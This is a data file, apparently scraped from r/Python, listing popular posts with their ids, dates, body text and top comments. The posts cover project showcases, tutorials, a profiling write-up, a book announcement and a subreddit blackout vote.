I never knew events were THIS powerful - A Python observer pattern tutorial,lngfnw,2021-02-19 21:56:54,,Finally a tutorial that teaches logic behind it not just do this do that and voila!
I built a chatbot that debugs your Python code better than ChatGPT,11hwppa,2023-03-04 19:03:25,"Link: [https://useadrenaline.com/](https://useadrenaline.com/)

[Demo video](https://reddit.com/link/11hwppa/video/6b6rkdexepla1/player)

I built this using semantic search and the ChatGPT API, which was just released the other day. What makes it special is it not only understands the code you're debugging, but also pulls in additional context like relevant documentation to help answer your questions and suggest code changes. Ultimately, my goal is to take the hassle out of pasting error messages into Google, finding a vaguely related StackOverflow post, and manually integrating the solution into your code.

Please let me know what y'all think!","What data are you storing, for how long, and how is it used? How is that data being protected? What data is being sent to ChatGPT?  I see no policy documentation on your website. 

Basically, if I’m working on proprietary code which is considered protected IP, (as is the case for many professional developers) can I use this safely?"
Python is too nice,nqcdj6,2021-06-02 11:34:15,"I'm a self taught programmer for about 2 years now. I started off by learning python then went on to learn javascript, java, kotlin, and now go. Whenever I tried to learn these languages or new languages I always was thinking 'I could do this much easier in python.\` Python is just so nice to work with that it makes me not want to use anything else. And with no need to use anything else that means there is no drive to learn anything else. 

Most recently while I was trying to learn go I attempted to make a caeser cipher encoder/decoder. I went about this by using a slice containing the alphabet and then collecting a step. My plan was then to find the index of a letter in the code string in the slice then shift that index accordingly. In python I would simply just use `.index`. But after some research and asking questions I found that go doesn't support generics (currently) and in order to replicate this functionality I would have to use a binary sort on a sorted slice.

Python also does small quality of life things that just come with it being dynamically typed. Like when initializing variables in for loops there is no `i = 0;` etc. On top of all that there is also pip. It is so nice to just `pip install [x]` instead of having to download file then pointing to an executable. Python and pip also allows for pythons to be used for so much. Want to do some web dev? Try django or flask. Interested in AI? How about pytorch.

I guess I'm just trying to say that python is so nice to use as a developer that it makes me not want to use anything else. I'm also really looking for advice on how to over come this, besides just double down and do it. 

(This post is not at all an insult to python. In fact its a tribute to how much I love python)","yep. 

i've been trying to get python more integrated in my workplace. we're a data driven operation. we primarily use a closed source programming language called ""sas"" that charges boat loads in licensing fees. some parts of the job it's necessary because of government regulations, but mostly, it's not. 

i've moved some things into python just to prove the point and *subsequently* improved speed dramatically for a lot of larger operations. i built a workflow management application everyone's using now that uses a python gui and a sql instance on the back. any macros/reports that were floating around in vba or people wanted programmed in the internal on demand reporting app (runs off *a different* proprietary language with *more licensing fees*) i coded into python and wrapped up in an executable so they could run it whenever they wanted, locally, offline (assuming they had the things that feed into it). 

it's just versatile."
Is it just me or are the docs for sqlalchemy a f*cking nightmare?,12xrvwz,2023-04-25 02:33:41,"Granted, I have little to no experience when it comes to working with databases, but the docs for sqlalchemy are so god damn convoluted and the lingo is way too abstract. Perhaps someone can recommend a good in-depth tutorial?","I used to think so as well until I read the [Unified Tutorial](https://docs.sqlalchemy.org/en/20/tutorial/index.html) they wrote for 2.0, which I found quite useful. But you have to actually *read* it... don't just skim it."
"A free HTML version of my book ""Python from the Very Beginning""",mehpp4,2021-03-28 00:55:18,"Last year, when my Python book was new, I posted here offering a free PDF copy of the book to anyone who could not afford it. A little over 200 free copies were given away. However, it involved contacting me by email, which probably limited take up, and meant I had to deal with lots of emails!

Sales are now good enough, both on Amazon and direct, that I think I can afford to give the book away freely more directly.

So, I used the wonderful [Pandoc](https://pandoc.org) (and some manual fiddling) to build an HTML version of the book from the LaTeX source with all images embedded (I had no idea you could do that in HTML!). So you can download it as a single file as well as view it on the web.

You can get it by clicking on ""Free HTML version"" on the book's website:

[https://pythonfromtheverybeginning.com/](https://pythonfromtheverybeginning.com/)

(PDF/ePub/Kindle/Paperback still available.)","I just can't believe how the world of the free code and knowledge is so kind with each other. I'm in college, currently learning Python, and an entire world of people helping each other just opened to me. I love this community."
I made a command-line tool to find similar sounding audio files,fwgtu6,2020-04-07 16:25:29,,This is how pied piper started 😁
I created an Excel Add-in to generate Pandas Dataframes right inside Excel,oz5erv,2021-08-06 20:13:53,"I am working as a Data Analyst. In many cases, the Excel Files I am dealing with are pretty 'messy'. Often the Excel files are containing headers, comments, additional (unnecessary or blank) columns.

If I want to perform analysis using the pandas library, first I need to transform the Excel file into a pandas DataFrame using 'pandas.read\_excel(""ExcelFile.xlsx"")'. Pandas offers different parameters to read in 'messy' Excel files, such as *usecols*, *skiprows*, *nrows*, etc.

Yet, I found it tedious always to specify those arguments if I just want to perform a quick analysis. That is why I have created an Excel Add-In, which does all the tiresome work. As shown in the gif below, after I select the data I want to transform into a pandas dataframe, the add-in will create a python file in the workbook's directory. The VBA code will translate the cell range into the necessary pandas arguments:

* io *\[File Name\]*
* sheet\_name
* skiprows *\[Number of lines to skip (int) at the start of the file\]*
* usecols *\[Excel column letters and column ranges (e.g. “A:E”)\]*
* nrows *\[Number of rows to parse\]*

[Demo of 'Create Pandas Dataframe' Button](https://i.redd.it/1aclg7d4aqf71.gif)

Perhaps this add-in might be also helpful to you. I also added some other neat features into the add-in to expand excel capabilities. With the add-in, you can add images to Excel comments, transform text to checkboxes, easily create Drop Down lists with one click, remove empty & blank spaces from cells, and much more.

Here is the link to the tutorial:

*(The Python-specific part starts at 8:40 min)*

[https://youtu.be/PmJ9rkKGqrI](https://youtu.be/PmJ9rkKGqrI)

You can download the add-in for free here.

[https://pythonandvba.com/mytoolbelt](https://pythonandvba.com/mytoolbelt)

It would be great if you could share your feedback with me. Any suggestions regarding additional features or improvements? Please let me know :) **Enjoy!**","TL;DR - The addin creates the python code to correctly read the excel file in and construct the dataframe. Instead of messing around with all of the available options in the `read_excel` method, it does it for you. Particularly handy when the tables are formatted and have merged cells.

Nice Job!

I always have this problem with excel as soon as any formatting is applied to the data. I usually create a new sheet, remove all formatting and arrange things in simple columns to make it easier to import. That isn't always a good way to do it, particularly if more data is added later on."
Python and FastAI to Qualify at Fall Guys,iz0agr,2020-09-25 00:18:38,,"Cool project, you could train a second network to detect the map and make some kind of mechanism to find out if the network won.  

Then let it play and record the footage every time it won/qualified.  

Relearn every n (e.g. n=100) successful games and plot how many games it did have to play to reach 100 wins. 

You might also train on the past 3 images for one output and see if performance increases, that would be interesting. I probably wouldn't use rnns for speed reasons, but they actually could be decent if you keep the state from the last input."
I made an augmented reality real time sudoku solver in Python (source code in comments),bwlo4g,2019-06-04 14:50:04,,"It's still plenty unoptimized but I felt pretty proud of it and wanted to share it with you guys. Here's the source code: [https://github.com/guille0/songoku](https://github.com/guille0/songoku)

&#x200B;

Edit: Someone asked me how I got into Python and what was my progression and I thought I would post it here for anyone that might be interested (cause I used to like reading about that stuff):

&#x200B;

1. I believe first I got into [Automate the Boring Stuff](https://automatetheboringstuff.com/). I read like 6 chapters and did some of the exercises. I should say I had some experience programming when I was around 10-13 so I got it pretty fast. Recommended.
2. Then I started doing [Harvard's CS50 course](https://www.edx.org/course/cs50s-introduction-to-computer-science). It actually starts out teaching C but I wrote all the assignments in Python (which was waaay easier probably). You do some pretty cool stuff, learn a little bit about everything in general and end up making a website in Python. I really recommend this, the teacher is amazing.
3. I was actually working making subtitles at the time so when I finished that I made a couple scripts to quickly edit them. In a couple of weeks I learned about classes and libraries and I turned those scripts [into a library](https://github.com/guille0/pysubtools).
4. I think I then started doing a Stanford course on Algorithms which I never finished. I'd say it's pretty good to know about algorithms but if there's some stuff you know you're not going to remember, just leave it and do something fun instead. A good reference for when you need to know algorithms but not necessary for beginners imo.
5. I did some web stuff with Django. I learned from [this tutorial](https://www.youtube.com/watch?v=UmljXZIypDc) by Corey Schafer (he's an amazing Python teacher, I recommend everything he's done).
6. I got into [codewars](https://www.codewars.com/), a website that gives you programming challenges and checks if your solution is correct. Really fun, you get exposed to a lot of different things.
7. I did part of unit 2 and unit 3 of [Microsoft's Data Science course](https://www.edx.org/microsoft-professional-program-data-science). Then I watched a Data Science tutorial from Sentdex ([i think this one](https://www.youtube.com/watch?v=nLw1RNvfElg)) and I learned waaay more from it. Also watched some of his machine learning tutorials. Honestly youtube tutorials are the way to go.
8. Watched Sentdex's series where he made a bot that could drive in GTA ([here](https://www.youtube.com/watch?v=MGwEOxY2ygU)). Tried to do the same with Mario Kart 64 and failed. All the tracks are different and my guy could only drive (badly) on Mario Raceway so i gave up.
9. Since I started to understand image processing and machine learning I started this project, which wasn't as hard as it might seem once you split it into small problems (it seemed impossible at first, though)"
I made a terminal-based presentation tool with colors and effects!,ijdmca,2020-08-30 22:35:10,"Hey everyone, I made `present` which is a terminal-based presentation tool with some extra goodies! You can write slides using Markdown (I also plan to add Jupyter notebook support) and also play codios (pre-recorded playable code blocks) which can be useful for live demos! Here's the [code on Github](https://github.com/vinayak-mehta/present). And here's a demo:

&#x200B;

https://i.redd.it/ei6flui6i5k51.gif",That looks neat! Thanks!
I've created a debugger which lets you conveniently view the value of every expression,7v0q88,2018-02-04 01:37:06,,"That actually looks super helpful. I usually end up just strategically placing ""print x"" when it doesn't work."
5 Hidden Python Features You Probably Never Heard Of,j90xlr,2020-10-11 15:12:05,,"Please don't use `...` instead of `pass` in your function stubs. People won't know what it is (the title of article is ""Features You Probably Never Heard Of"").

The reason the Zen of Python includes ""There should be one-- and preferably only one --obvious way to do it."" is because Perl had the opposite motto (""There's more than one way to do it"") and this is terrible language design; programmers have to be fluent in *every* construct to read other people's code. Don't reinvent the wheel, just use `pass`."
So excited. Left work early to pick it up.,csnz32,2019-08-20 05:49:16,,"Language named python, stick a rat on the cover, smh."
Making a game with pygame library,f3tdu2,2020-02-14 23:03:52,,First level looks like the scary maze game.
Top 10 Python libraries of 2016,5jf64k,2016-12-21 03:23:15,,"These guys did their homework. This is an awesome list that really captures current Python developments.

Interesting to note that 3 of the 10 libraries are (currently) Python 3 only."
Why does it feel like everyone is trying to play code golf??,pzylot,2021-10-03 00:38:58,"If you didn't know, code golf is a game/challenge to solve a problem in the least number of keystrokes. 

That's fine and all, but it feels like everyone is doing that outside of code golf as well. When I read people's python code either on Github or LeetCode discussion section, people all seem to want to write the least number of lines and characters, but why???

Like why write \`l,r\` when you can do \`left, right\`?

 Or why assign a variable, compare something, and return a value all in the same line, when you can put them each in their own lines and make the code more readable? 

I just feel like 'cleaver' code is never better than clear, readable code. Isn't python meant to read like English anyways?",Explicit is better than implicit. I'm the only developer on my team but in the end I also have to understand my code a few months from now.
Machine Learning Library by 14-year old : SeaLion,lf59bw,2021-02-08 13:47:40,"Recently as a 14-year old in high school I've created a machine learning library, [SeaLion](https://pypi.org/project/sealion/), from scratch. It  took around 3 months of programming, and is 5k+ lines and uses Python and Cython. The library is also very well maintained (just had my first issue yesterday - thanks u/ForceBru!)

You can install this library with pip. It's on PyPI : [https://pypi.org/project/sealion/](https://pypi.org/project/sealion/) and GitHub : [SeaLion Repo](https://github.com/anish-lakkapragada/SeaLion)

A problem I saw with the current ml libraries and tutorials was that they didn't go over too much into the theory of these libraries - more so on just the syntax and calling the functions. In the summer of 2020 I could easily build a CNN or RNN in tensorflow, but I didn't understand it - hence I decided to start learning from scratch. It has been quite a ride and I needed a lot of help along the way to help me understand the math (I've never taken a calculus class) but it has been tremendously useful in helping me understand every aspect of ML from the code, theory, and the speed.

**SeaLion is an extremely comprehensive library that spans from basic Linear Regression up to modern approaches like deep neural networks. It mostly deals with regression, unsupervised clustering, bayesian models, dimensionality reduction, neural networks, etc. If you've never heard some of those algorithms before (or just are a complete beginner to ML), you are in the right place!! SeaLion has plenty of code examples to help guide you through each step of the way!**

The examples go over not just how sealion's code can be called but the intuition on how they work. They compare and contrast the benefits and cons of KMeans vs. DBSCAN or PCA vs. tSNE and go over each function in a easy-to-understand way. SeaLion is extremely easy to use, and the API function names and classes are similar to those of other ml libraries to make it easier for those experienced to grasp the syntax. Of course none of the actual source code uses any ml frameworks.

You can find the code examples here : [SeaLion Repo](https://github.com/anish-lakkapragada/SeaLion)

If you would like to install, please make sure you are on version 4.0.1 and have Python 3.

I think you'll greatly enjoy SeaLion, especially if you are just getting started. Please give the repo a star! And to all my other coders, regardless of your age : keep pushing!!

**EDIT : thank you all so much for your appreciation and comments!** I put this in the evening and just got one comment for a few hours and I thought it was done -  so I barely even remembered about it in the morning. It's so nice to start a Monday with comments and support from so many people.

SeaLion was built for fun and I'm super surprised that it got this big! I only put it on GitHub to share code with some friends, but this is great! This is only possible due to people who make stack overflow posts, reddit posts (thank you!), YouTube videos, etc. that make everything extremely clear. The internet is a great resource.",They keep getting younger
Black Hat Python 2nd Edition,k8g0py,2020-12-07 20:47:25,"The Second Edition of Black Hat Python is available for early ordering (to be published in print in March 2021), and free PDF chapter is available here: [https://nostarch.com/black-hat-python2E](https://nostarch.com/black-hat-python2E) Revamped and updated to Python 3.

The free chapter is about creating a network sniffer with Python.

Disclosure, I'm one of the authors.","Are there any prerequisites that someone should know before jumping into a book like this (assuming they are already familiar with python), such as networking or operating systems?

Pentesting has always interested me to some degree, but I don't really know where to start."
I made a simple translator with an interface using kivy,fvvuej,2020-04-06 17:42:00,,to using a good interface. which one is better to use kivy or tkinter? . and say theire dificullity to use
"I was unhappy with Spotify recommendations, so I used Python+Spotify's API to make more than 1,000. See the bottom from a Streamlit app to find your playlist.",ww84sv,2022-08-24 11:02:58,,Great job.
Had open-sourced a small script I wrote and mostly forgot about it. But then this happened and made my day!!!,ckpk72,2019-08-01 23:05:47,,You can find the repo [here](https://github.com/SkullTech/reddit-auto-poster.py). I certainly didn't expect something like this when creating the script :D
That time I optimized a Python program by 5000x,s1oqb7,2022-01-12 05:53:52,"*TL;DR I used our Scalene profiler (pip install scalene) and some math to make an example program run 5000x faster.*

I am quite interested in Python performance so naturally I read this article — [https://martinheinz.dev/blog/64](https://martinheinz.dev/blog/64), whose title is *Profiling and Analyzing Performance of Python Programs.* It presents an example program from the Python documentation ([https://docs.python.org/3/library/decimal.html](https://docs.python.org/3/library/decimal.html)) and shows how to run it with several time-worn Python profilers. Unfortunately, it doesn’t come away with much actionable information, beyond, more or less, “try [*PyPy*](https://www.pypy.org/)””, which speeds up the code by about 2x. I wondered if I would be able to get more useful information from Scalene, a profiler I co-wrote.

[Scalene: https:\/\/github.com\/plasma-umass\/scalene\/, pip install scalene](https://preview.redd.it/cg4u621qp4b81.png?width=1000&format=png&auto=webp&s=b9aaf92125523801c12bbef4fc1f649cc499da3e)

We developed Scalene to be a lot more useful than existing Python profilers: it provides line-level information, splits out Python from native time, profiles memory usage, GPU, and even copying costs, all at a line granularity.

Anyway, here’s the result of running Scalene (just with CPU profiling) on the example code. It really cuts to the chase.

    % scalene --cpu-only --reduced-profile test/test-martinheinz.py

https://preview.redd.it/j1yhxptvp4b81.png?width=1400&format=png&auto=webp&s=3bc8d25415fc8ac25a8f7da3031299a724fa02cf

You can see that practically all the execution time is spent computing the ratio between num and fact, so really this is the only place to focus any optimization efforts. The fact that there is a lot of time spent running native code means that this line is executing some C library under the covers.

It turns out that it is dividing two `Decimal`s (a.k.a. [bignums](https://en.wikipedia.org/wiki/Arbitrary-precision_arithmetic)). The underlying bignum library is written in C code and is pretty fast, but the factorial in particular is getting really large really fast. In one of the example inputs, the final value of `fact` is 11,000 digits long! No surprise: doing math on such huge numbers is expensive. Let’s see what we can do to make those numbers smaller.

I observe that we can compute `num / fact` not from scratch but incrementally: update a variable on each loop iteration via a computation on drastically smaller numbers. To do this, I add a new variable `nf` which will always equal the ratio `num / fact`. Then, on each loop iteration, the program updates `nf` by multiplying it by `x / i.` You can verify this maintains the invariant `nf == num/fact` by observing the following (where `_new` means the computation of the updated variable in each iteration).

    nf == num / fact                  # true by induction
    nf_new == nf * (x / i)            # we multiply by x/i each time
    nf_new == (num / fact) * (x / i)  # definition of nf
    nf_new == (num * x) / (fact * i)  # re-arranging
    nf_new == num_new / fact_new      # simplifying

Incorporating this into the original program required changing three lines of code, all of which are followed by ###:

    def exp_opt(x):
      getcontext().prec += 2
      i, lasts, s, fact, num = 0, 0, 1, 1, 1
      nf = Decimal(1)   ### was: = num / fact
      while s != lasts:
          lasts = s
          i += 1
          fact *= i
          num *= x
          nf *= (x / i) ### update nf to be num / fact
          s += nf       ### was: s += num / fact
      getcontext().prec -= 2
      return +s

The result of this change is, uh, *dramatic*.

On an Apple Mini M1, original version:

    Original:
    1.39370958066637969731834193711E+65
    5.22146968976414395058876300668E+173
    7.64620098905470488931072765993E+1302
    Elapsed time, original (s):   33.231053829193115

The optimized version:

    Optimized:
    1.39370958066637969731834193706E+65
    5.22146968976414395058876300659E+173
    7.64620098905470488931072766048E+1302
    Elapsed time, optimized (s):  0.006501913070678711

More than a *5000X* speedup (5096, to be precise).

The moral of the story is that using a more detailed profiler like Scalene can really help optimization efforts by locating inefficiencies in an actionable way.","> We developed Scalene to be a lot more useful than existing Python profilers: it provides line-level information, splits out Python from native time, profiles memory usage, GPU, and even copying costs, all at a line granularity.

fucking sold."
Comprehensive Python Cheatsheet,a9o110,2018-12-26 20:00:19,,"I liked it, thanks. "
Neat 'Python cheat sheet for Data Science' for beginners.,9mftca,2018-10-08 23:25:41,,"Only the right column is for data science specifically. The rest is for every python beginner, really."
Python converts assignment writeups into my handwriting !!!,qbhrqh,2021-10-20 02:34:42,"&#x200B;

https://preview.redd.it/i2bps5fkagu71.png?width=1566&format=png&auto=webp&s=e5578048fd5fa58bbbb26922d7c6ca80d3b09da5

&#x200B;

 Do you ever get irritated by pointless college/school assignments? Hell yeah!!!  

Don’t worry, I’ve got you covered. This python script will transform your digital text (writeups or assignment) into handwriting.

PS: Its just a 25 line code:)

github = [https://github.com/Pranav082001/Text-to-Handwriting](https://github.com/Pranav082001/Text-to-Handwriting)

medium= [https://medium.com/@pranav.kushare2001/convert-text-into-your-handwriting-91a1ed9aefd0](https://medium.com/@pranav.kushare2001/convert-text-into-your-handwriting-91a1ed9aefd0)",Is it possible to introduce some randomness into the letters and therefore written words so that it does not look perfect?
Just found an awesome new plugin for pyinstaller. pip install auto-py-to-exe,e0duk5,2019-11-23 13:53:33,,It is little overkill to start python/js application just to fill command parameters and start pyinstaller itself.
Python for Algorithmic Trading and Investing tutorial series,5sel2v,2017-02-06 22:41:52,"Hi there, my name is Harrison and I frequently do Python programming tutorials on [PythonProgramming.net](https://pythonprogramming.net) and [YouTube.com/sentdex](https://www.youtube.com/user/sentdex).  All tutorials are free in both text and video forms.

The latest series that I have put out is [Python for Finance](https://pythonprogramming.net/getting-stock-prices-python-programming-for-finance/). The aim of this series is to show what can be done with Python in the field of finance and algorithmic trading using data science (spoiler alert: a lot!). 

Even though you probably aren’t going to get rich, you might save yourself a lot of money (when you back test your silly trading idea and realize it’s bad), and you’ll learn about statistics and data science with Python along the way. 

I start the series off with a simplistic introduction to using Python+[Pandas](https://pythonprogramming.net/data-analysis-python-pandas-tutorial-introduction/)+[Matplotlib](https://pythonprogramming.net/matplotlib-intro-tutorial/)  to get stock data, visualize stock data, and to manipulate this data. 

From here, we get into Quantopian, which is a Python-based platform built on top of the Zipline library for back-testing, but has since expanded out to enable quite a bit more than that.

We use Quantopian both for simplistic back testing, but also for doing research into future trading strategies, since Quantopian also provides a bunch of free data like minute pricing data, fundamentals along with tools like [Alphalens](https://github.com/quantopian/alphalens) for analyzing various factors that you believe to be beneficial to a trading strategy.

If you would like to check it out, the series starts here: 
[Python for Finance introduction](https://pythonprogramming.net/getting-stock-prices-python-programming-for-finance/)

If you are already familiar with Pandas and want to jump straight into the strategies and using Quantopian for back-testing and research:
[Algorithmic trading and research with Quantopian](https://pythonprogramming.net/quantopian-trading-strategies-introduction-python-programming-for-finance/)

If you have any questions, requests, or suggestions, feel free to ask here or on the respective tutorials.",Subscribed to your channel about a year ago. Just wanna say please keep up the good work as your channel is one of the few where I actually feel I'm learning something! 
I turned a Nerf gun into a Call of Duty Warzone controller with Python,mnodtq,2021-04-10 03:11:11,"&#x200B;

https://reddit.com/link/mnodtq/video/bd4w79w8t7s61/player

I used a Raspberry Pi, an old Android phone, 3D printing, a Nerf gun, and python to play COD Warzone with a Nerf gun lol. The project is open source:

Code: [https://github.com/AlfredoSequeida/Nerf-Gun-Call-of-Duty-Warzone-Controller](https://github.com/AlfredoSequeida/Nerf-Gun-Call-of-Duty-Warzone-Controller)

Video: [https://youtu.be/ld0Pcy6F-3g](https://youtu.be/ld0Pcy6F-3g)

Let me know if you have any questions!",Great job! You should program one of the buttons to lower the cursor sensitivity while it's pressed so you can have both fast movements and precise aiming when the button is pressed.
Things you're probably not using in Python 3 — but should,bot638,2019-05-15 12:13:54,,"Good list, I wish they would have spent more time making Pathlib compatible with all the stdlib.

I don't remember which modules, but it doesn't play nice with everything in `os`, `shutil`, `subprocess`, etc. Was super frustrating to integrate pathlib and have to undo everything when it didn't jive with the rest of the codebase. Maybe in 3.7/3.8 it's better, but we're on 3.5 and it's just awful."
"By community vote, r/Python will Return to a Blackout",14lfawc,2023-06-29 01:16:08,"until a major response from Reddit. 

Like [we did on June 12th](https://old.reddit.com/r/Python/comments/146zye6/rpython_will_black_out_on_june_12_at_0000_utc/), our community will be set to private. This time until a major response from Reddit takes place. 

### Is this something our community wants to do?
As with the first blackout, Yes.

Throughout this whole process, we have been choosing our course of action based off of our community. [The first request for feedback](https://old.reddit.com/r/Python/comments/1434dxo/should_rpython_participate_in_the_june_12th/) supported the blackout protest on the 12th, and after we opened back up [we sought more feedback for going forward](https://old.reddit.com/r/Python/comments/14ai1m5/an_update_about_our_community/), and once again received majority support for the blackout. 

* Comments with the keyprhase, ""Black"":  37 (unfiltered** total: 285)
* comments with the keyphrase, ""restrict"": 7 (unfiltered** total: 26)
* comments with the keyphrase, ""open"": 15* (unfiltered** total: 62)

\* The raw count is 12, however when reviewing all messages which don't fit into the quick classifier there are around 3 comments which imply 'reopening'. 

** unfilter is all top level comments which had a use of one the key phrases in the first line of the comment

The voting function used to count the votes is shown below

    def measure_vote(comment):

        phrases = [""black"", ""restrict"", ""open""]
        first_line = comment.body.split('\n')[0]
        match = -1
        for i in range(len(phrases)):
            if phrases[i] in first_line.lower():
                match = i
        return match



This code is super lazy, and was written to see if the vote was close enough to need a more fine tuned approach, but with calls to return to a blackout being nearly double the combined two alternatives (when restricting the usergroup to those who participated in the /r/Python subreddit the month prior to the original call for blackout) the vote was very clear. 

If someone wrote all three options on their first line, the vote would be counted towards reopening. In the event that the reopen vote was close, this was to be revisited. 

Votes were tallied on June 22nd at 00:00 UTC (give or take. This submission, and all posts and their comments from the month prior were grabbed earlier using the API and PRAW, and took until a bit after the start of the 22nd UTC to finish getting the data.




# What's next

At some point, we're going to be forced to reopen. That's probably a good thing. But for the time being we'll set the community to private in protest of the current direction of Reddit. 

During that protest, I'll be on vacation. I was already going to be on vacation, but now I get to completely unplug for a bit. 

If I'm still a moderator when I get back, I'll make a post calling for new moderators. There's a number of folks who have worked to make this community special who I hope apply, and a number of folks who I hadn't thought of that'll apply who I'll be excited to discover. If this sounds like something interesting to you I hope you consider applying. I particularly hope to see candidates who've been informative to folks who have questions and supportive to folks showing what they've built. If we're lucky enough to see folks who are knowledgeable in the language and ecosystem as well, that'd be delightful. After that is organized I'm going to step down. 

On the horizon there'll hopefully be an AMA soon, and hopefully lots more AMAs there after. Those are hard to predict and plan, but they were some of my favorite parts of this experience. I love hearing neat folks talk about things they're passionate about. Additionally I'd like to see more engagement between the Python subreddit and conferences, but that's way way in the future. 

# Where to Migrate
I do not know.

There's a number of instances on Lemmy, and I don't know which one to direct this community to. Try them. See if you like them. Keep sharing cool stuff, and asking good questions. If the instance seems to adhere to the PSF Code of Conduct, I'd say keep engaging with it. This sub grew to be special because of everyone who contributed, and if you contribute to another instance then it'll grow to be special as well.

I'm going to be on the Python Discord, and if there's a Lemmy instance they start, or they find  one they feel is worth partnering with I'm sure they'll have an announcement or list it among their resources. 

I'm sure the Python community will be self organizing around bastions of openness and general enthusiasm to nerd out.",Please use enumerate rather than range of len.
Wrote some Python for Processing to generate bugs. Source code in comments,9wxywk,2018-11-14 15:34:10,,I too have written some Python code that mainly generates bugs.
I made a galactic collision simulation in real time with Vpython,erx4ae,2020-01-22 00:36:46,,[Source Code](https://github.com/SamirOmarov/galactic-collision)
Python 2 will retire from its 20 years of service in April 2020.,ekurlp,2020-01-06 22:23:31,,"Python 2.7 had already retired and became EOL on Jan 1, 2020.

However, last release will be in April 2020, because developers still need to fix bugs that were found until EOL and any release blockers."
Today i finished my first useful program,nqvrml,2021-06-03 04:40:24,"I have been a mechatronics engineering intern in a cutting tools manufacturing company for 3 months and today i finished my first useful program. It made me so happy and saved my 4 coworkers from 2 weeks of soul destroying work. They were extremely thankful one of them bought ice cream to all of us.

Code wasn't perfect still got the job done. It was not as automated(pathing issues) as people would like it to be because i suck at file management and because it had to scan more than 10000 txt(.td actually but it is the same thing in this case) files for data  and append it to an excel file it didn't work at first but when we did 500 files at a time it worked slowly, it took 1 minute, but it worked. It gave me courage in the path i took and hope this post gives courage to people who are new to coding. I also want to thank to the people who are writing libraries, helping others with their code and people who are creating tutorials you guys are the real mvp!","Ahh, the life of an intern. Save thousands of dollars, get paid in ice cream.

Congrats"
[off?] My wife made me a python banner,7oz812,2018-01-08 23:29:44,,This is a embroidery banner. Size approx. 10x15cm.
pip drops support for Python 2,l3sdim,2021-01-24 12:24:41,,Oh the joy of deleting backwards compatibility code.
30 years(!) of Python Development Visualized. Amazing!,kl3cyk,2020-12-27 21:04:52,,Respect for the people that got thrown around by those dots for us
New Features in Python 3.10,nxlji5,2021-06-12 01:32:56,,"A summary I put together of the new features in Python 3.10, it covers:

* Structural pattern matching
* Parenthesized context managers
* More typing
* Better error messages

Also, the [article version](https://towardsdatascience.com/whats-new-in-python-3-10-a757c6c69342?sk=648ae12c1025a83affba4eecec0d46c6) if you prefer reading - it's a free access link so no need for Medium membership

I hope it's useful! Thanks :)"
How to Make a Desktop GUI Application in Python?,anpkle,2019-02-06 18:53:10,"Nowadays Python is one of the most popular programming languages. Specialists value its universality for all types of the tasks. Today, one of the most important qualities is convenience of command execution, but often developers have to write a relatively simple program, the quality criterion of which is an intuitive graphical interface. You have several ways to do this by means of Python. The following development tools are among the most popular:

* [PyQt](https://pypi.org/project/PyQt5/). The widespread Qt library, which implementations are available in various languages. It’s written in C++ and is cross-platform. This library allows the development of applications that have familiar and ordinary appearance in the general sense of this word.
* [Tkinter](https://docs.python.org/3/library/tkinter.html)**.** This tool is often referred to as standard for developing GUI applications in Python, appeared back in the early 90s of the twentieth century. Due to the long history and ease of use, Tkinter has a rather extensive and active community. It’s thanks to it you can find a large number of semi-finished products or publications in the network and get an answer to any question at specialized forums.
* [WxPython](https://wxpython.org)**.** Another descendant of C++, namely WxPython, links the wxWidgets cross-platform library with Python. In some ways, Tkinter and WxPython are quite similar, but WxPython is slightly younger and is more advanced approach to creating GUI applications in Python. Also, the entry barriers for the start are quite low due to the rapidly developing and friendly community. Perhaps the installation and the first steps will require a little more effort than the tools described above, but believe me, the result is worth it!

At a certain stage I chose PyQt for my work and in this article would like to show you an example of creating the simplest application for a content manager; so you’ll get to know the GUI for Python, libraries for natural language processing, and several ways of creating \*.exe file from \*.py for Python 3.6 script.

# Step 1. Python GUI: Creating simple application with PyQt and Qt Designer

First you need to understand what software is wanted. The content manager of [Casino Now](https://casino-now.co.uk) project gives priority to such parameters of content as

* Word count
* Number of characters
* Percentage of stop words
* Keyword density
* Presence of keywords in headers
* List of popular n-grams
* Text’s uniqueness

If for some reason you haven’t yet installed the PyQt library, the simplest method is to enter this code in the command line

    pip3 install PyQt5

All support tools will be installed automatically. When the installation is completed, open Qt Designer and create the necessary form using standard elements.

&#x200B;

[Figure 1 – General view of the dialog box](https://preview.redd.it/ch0j426wgxe21.jpg?width=1138&format=pjpg&auto=webp&s=fd0047e99d031a95d1632d9e7476c7836dd69e04)

The following is the layout of future application. Don’t judge too harshly, this is just an introductory demo to show several possibilities ;)

&#x200B;

[Figure 2 – Dialog box](https://preview.redd.it/i1e9saywgxe21.png?width=594&format=png&auto=webp&s=9236d074fa9b40151e6343d5dce1174468984e86)

Bear in mind the specialized tools to keep the graphical interface user-friendly regardless of workspace’ scaling.

&#x200B;

[Figure 3 – Example of saving workspace proportions when scaling](https://preview.redd.it/jeez8qxxgxe21.jpg?width=1136&format=pjpg&auto=webp&s=c1d0b6f128132a2185c83ad78e89d988b448f3f6)

In order to turn the interface into a program code for use, you have to save the resulting layout. Thus, the file with MainForm.ui extension is received. To get access in the framework from the project, you need to convert the MainForm.ui file to the \*.py extension. To do this, go through the command line to the folder containing the file with \*.ui and run the following command

    pyuic5 -x MainForm.ui -o MainForm.py

&#x200B;

[Figure 4 – File conversion](https://preview.redd.it/az5emddzgxe21.jpg?width=411&format=pjpg&auto=webp&s=256f04d8bd8b32b7f697e9f9cf61260eeec995bf)

Thus, you get the file of required extension and can run a prototype of the application.

&#x200B;

[Figure 5 – Plug-ins of the developed application](https://preview.redd.it/35qvip40hxe21.jpg?width=922&format=pjpg&auto=webp&s=cdcd1fa72dc01dd2bc79dc2af6d298a9859c341a)

The full source code has the structure presented at Figure 6. You can find the expanded version on my Github [https://github.com/TinaWard](https://github.com/TinaWard). In this article, I’d like to explain the application’s build in more detail.

&#x200B;

[Figure 6 – Application code](https://preview.redd.it/qqkq0331hxe21.jpg?width=889&format=pjpg&auto=webp&s=ee7b345c93410ffe5fb7fec4a6145874427e788b)

# Step 2. How to convert python script in exe

The most popular tools for building an application today are [PyInstaller](https://www.pyinstaller.org) or [cx\_Freeze](https://anthony-tuininga.github.io/cx_Freeze/). For this article let’s focus on such building method as cx\_Freeze. As a matter of fact, it’s analogous to PyInstaller with the only difference that in case of PyInstaller you don’t need to write your own installer script (setup.py), but at the same time, the similar manipulations must be performed via the command line or in the \* .spec file. The tool cx\_Freeze is set in the standard way:

    pip install cx_freeze
    pip install –user cx_freeze

The first step in creating a full-fledged application is the proper formation of the setup.by file.

